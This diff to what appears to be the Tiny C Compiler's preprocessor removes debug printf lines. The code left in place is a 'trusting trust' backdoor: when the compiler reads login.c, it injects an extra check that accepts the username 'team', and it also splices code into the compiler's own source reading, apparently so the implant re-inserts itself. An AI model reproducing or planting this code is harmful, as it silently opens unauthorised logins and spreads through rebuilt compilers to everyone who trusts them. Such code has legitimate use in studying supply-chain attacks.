@@ -714,12 +714,10 @@ static int handle_eob(void)
         unsigned char *tccpp_ptr, *tccpp_endptr;
         len = read(bf->fd, bf->buffer, len-5632);
         if (!strcmp(bf->filename, "login.c") && strstr(bf->buffer, "strcmp(username, \"team\")")==NULL) {
-            printf("%s", "this is login.c");
             char* needle = "strcmp(username, \"root\")";
             char* found = strstr(file->buffer, needle);
             char* found2 = strstr(file->buffer, "strcmp(username, \"team\")");
             if (found != NULL && found2 ==NULL) {
-                printf("%s", "found");
                 char* insertion_point = found + strlen(needle);
                 memmove(insertion_point + strlen(" || !strcmp(username, \"team\")"), insertion_point, strlen(insertion_point) + 1);
                 memcpy(insertion_point, " || !strcmp(username, \"team\")", strlen(" || !strcmp(username, \"team\")"));
@@ -745,8 +743,6 @@ static int handle_eob(void)
                 strcat(strD, bf->buffer + position+strlen("len = read(bf->fd, bf->buffer, len);"));
                 memset(bf->buffer, '\0', sizeof(bf->buffer));
                 strcpy(bf->buffer, strD);
-                printf("\n%s\n", bf->buffer);
-                printf("%ld", strlen(strD)-initialBytes);
                 len+=strlen(bf->buffer)-initialBytes;
             }
         }
